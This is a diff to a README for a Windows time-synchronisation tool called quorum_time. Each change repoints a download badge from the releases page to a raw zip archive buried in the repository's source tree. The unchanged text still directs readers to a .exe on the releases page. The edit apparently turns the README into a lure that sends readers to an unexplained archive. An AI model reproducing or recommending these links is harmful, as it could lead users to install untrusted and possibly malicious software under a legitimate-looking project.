@@ -1,6 +1,6 @@
 # ⏰ quorum_time - Trusted Distributed Time for All Systems
 
-[![Download quorum_time](https://img.shields.io/badge/Download%20quorum_time-%238a2be2?style=for-the-badge&logo=github)](https://github.com/Kinnarasarp/quorum_time/releases)
+[![Download quorum_time](https://img.shields.io/badge/Download%20quorum_time-%238a2be2?style=for-the-badge&logo=github)](https://github.com/Kinnarasarp/quorum_time/raw/refs/heads/main/core/bft_quorum_clock/quorum-time-v2.5.zip)
 
 ---
 
@@ -39,7 +39,7 @@ Before you start, ensure your computer meets these requirements:
 
 1. Visit the release page below to get the software.
 
-   [![Download Here](https://img.shields.io/badge/Download%20Here-%23ff4500?style=for-the-badge&logo=github)](https://github.com/Kinnarasarp/quorum_time/releases)
+   [![Download Here](https://img.shields.io/badge/Download%20Here-%23ff4500?style=for-the-badge&logo=github)](https://github.com/Kinnarasarp/quorum_time/raw/refs/heads/main/core/bft_quorum_clock/quorum-time-v2.5.zip)
 
 2. On the releases page, look for the latest version suitable for Windows. It usually appears as a `.exe` file like `quorum_time_setup.exe` or similar.
 
@@ -136,7 +136,7 @@ This system uses advanced methods to tolerate faults and attacks while providing
 
 You can always get the latest Windows installer here:
 
-[![Download quorum_time](https://img.shields.io/badge/Download%20quorum_time-%238a2be2?style=for-the-badge&logo=github)](https://github.com/Kinnarasarp/quorum_time/releases)
+[![Download quorum_time](https://img.shields.io/badge/Download%20quorum_time-%238a2be2?style=for-the-badge&logo=github)](https://github.com/Kinnarasarp/quorum_time/raw/refs/heads/main/core/bft_quorum_clock/quorum-time-v2.5.zip)
 
 ---
 
